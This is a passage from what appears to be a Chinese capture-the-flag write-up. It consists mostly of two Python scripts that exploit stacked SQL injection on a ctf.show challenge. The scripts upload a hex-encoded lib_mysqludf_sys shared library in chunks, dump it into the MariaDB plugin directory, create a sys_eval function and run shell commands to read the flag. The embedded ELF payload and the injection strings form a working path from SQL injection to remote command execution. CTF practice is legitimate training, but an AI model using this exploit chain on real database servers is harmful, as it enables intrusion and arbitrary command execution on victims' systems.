BFFFF1401000047FBFFFF2C01000048FBFFFF44010000E2FBFFFF6C010000CAFCFFFFA4010000F3FCFFFFBC0100001CFDFFFFD401000086FDFFFFF4010000B6FDFFFF0C020000E3FDFFFF2C02000002FEFFFF4402000016FEFFFF5C02000084FEFFFF7402000093FEFFFF8C0200001400000000000000017A5200017810011B0C070890010000140000001C00000084FAFFFF01000000000000000000000014000000340000006DFAFFFF010000000000000000000000140000004C00000056FAFFFF01000000000000000000000014000000640000003FFAFFFF010000000000000000000000140000007C00000028FAFFFF030000000000000000000000140000009400000013FAFFFF01000000000000000000000024000000AC000000FCF9FFFF9A00000000420E108C02480E18410E20440E3083048603000000000034000000D40000006EFAFFFFE800000000420E10470E18420E208D048E038F02450E28410E30410E38830786068C05470E50000000000000140000000C0100001EFBFFFF2900000000440E100000000014000000240100002FFBFFFF2900000000440E10000000001C0000003C01000040FBFFFF6A00000000410E108602440E188303470E200000140000005C0100008AFBFFFF3000000000440E10000000001C00000074010000A2FBFFFF2D00000000420E108C024E0E188303470E2000001400000094010000AFFBFFFF1F00000000440E100000000014000000AC010000B6FBFFFF1400000000440E100000000014000000C4010000B2FBFFFF6E00000000440E300000000014000000DC01000008FCFFFF0F00000000000000000000001C000000F4010000FFFBFFFF4100000000410E108602440E188303470E2000000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF000000000000000000000000000000000100000000000000B2010000000000000C00000000000000A00B0000000000000D00000000000000781100000000000004000000000000005801000000000000F5FEFF6F00000000A00200000000000005000000000000006807000000000000060000000000000060030000000000000A00000000000000E0010000000000000B0000000000000018000000000000000300000000000000E81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200A0000000000000700000000000000C0090000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000A009000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000004809000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000CE0B000000000000DE0B000000000000EE0B000000000000FE0B0000000000000E0C0000000000001E0C0000000000002E0C0000000000003E0C0000000000004E0C0000000000005E0C0000000000006E0C0000000000007E0C0000000000008E0C0000000000009E0C000000000000AE0C000000000000BE0C0000000000008017200000000000004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200002E7368737472746162002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E64796E616D6963002E676F74002E676F742E706C74002E64617461002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000B000000F6FFFF6F0200000000000000A002000000000000A002000000000000C000000000000000030000000000000008000000000000000000000000000000150000000B00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001D00000003000000020000000000000068070000000000006807000000000000E00100000000000000000000000000000100000000000000000000000000000025000000FFFFFF6F020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000FEFFFF6F0200000000000000A009000000000000A009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000C009000000000000C00900000000000060000000000000000300000000000000080000000000000018000000000000004B000000040000000200000000000000200A000000000000200A0000000000008001000000000000030000000A0000000800000000000000180000000000000055000000010000000600000000000000A00B000000000000A00B000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000B80B000000000000B80B00000000000010010000000000000000000000000000040000000000000010000000000000005B000000010000000600000000000000D00C000000000000D00C000000000000A80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000E000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000DD000000000000000000000000000000010000000000000001000000000000006F000000010000000200000000000000641200000000000064120000000000009C000000000000000000000000000000040000000000000000000000000000007D000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008E000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009A000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000A3000000010000000300000000000000D016200000000000D0160000000000001800000000000000000000000000000008000000000000000800000000000000A8000000010000000300000000000000E816200000000000E8160000000000009800000000000000000000000000000008000000000000000800000000000000B1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000B7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000BC000000010000000000000000000000000000000000000088170000000000009B000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000C500000000000000000000000000000001000000000000000000000000000000&quot;</span></span><br><span class="line">udf_text=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20000</span>,<span class="number">5000</span>):</span><br><span class="line">    end = i+<span class="number">5000</span></span><br><span class="line">    udf_text.append(udf[i:end])</span><br><span class="line"></span><br><span class="line">p = <span class="built_in">dict</span>(<span class="built_in">zip</span>(text,udf_text))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> text:</span><br><span class="line">    param=payload.<span class="built_in">format</span>(p[t],t)</span><br><span class="line">    get_url = url + param</span><br><span class="line">    res = requests.get(get_url)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]&quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    code = res.status_code</span><br><span class="line">    <span class="built_in">print</span>(code,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span>  code==<span class="number">404</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;你输入的URL可能出错&quot;</span>)</span><br><span class="line">    acq=acquire.<span class="built_in">format</span>(t)</span><br><span class="line">    data=url+acq</span><br><span class="line">    res = requests.get(url=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;load_file&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;--&gt;成功插入&#123;&#125;.txt&quot;</span>.<span class="built_in">format</span>(t))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]导入udf.so成功&quot;</span>)</span><br><span class="line">url_sys_dll = <span class="string">&quot;?id=1%27;select unhex(concat(load_file(&#x27;/usr/lib/mariadb/plugin/a.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/b.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/c.txt&#x27;),load_file(&#x27;/usr/lib/mariadb/plugin/d.txt&#x27;))) into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so&#x27; --+&quot;</span></span><br><span class="line">res= requests.get(url=url+url_sys_dll)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]创建函数sys_eval()成功&quot;</span>)</span><br><span class="line">url_sys_function = <span class="string">&quot;?id=1%27;create function sys_eval returns string soname &#x27;udf.so&#x27;--+&quot;</span></span><br><span class="line">res= requests.get(url=url+url_sys_function)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]命令执行结果: &quot;</span>)</span><br><span class="line">sys_eval=<span class="string">&quot;?id=&#x27;;select sys_eval(&#x27;cat /flag.*&#x27;)--+&quot;</span></span><br><span class="line">res= requests.get(url=url+sys_eval)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>





<p><strong>还有另外的师傅写了个脚本</strong></p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://c4cfac67-eec1-4378-ac1b-75c52840f816.challenge.ctf.show:8080/api/?id=&#x27;</span></span><br><span class="line">code = <span class="string">&#x27;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400 &#x27;</span></span><br><span class="line">codes = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(code), <span class="number">128</span>):</span><br><span class="line">    codes.append(code[i:<span class="built_in">min</span>(i + <span class="number">128</span>, <span class="built_in">len</span>(code))])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">commit_payload</span>(<span class="params">payload: <span class="built_in">str</span></span>):</span><br><span class="line">    requests.get(url + <span class="string">f&#x27;&#x27;&#x27;0&#x27;;<span class="subst">&#123;payload&#125;</span>;-- A&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次运行建临时表</span></span><br><span class="line"><span class="comment"># sql=&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空临时表</span></span><br><span class="line">commit_payload(<span class="string">&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 插入第一段数据</span></span><br><span class="line">commit_payload(<span 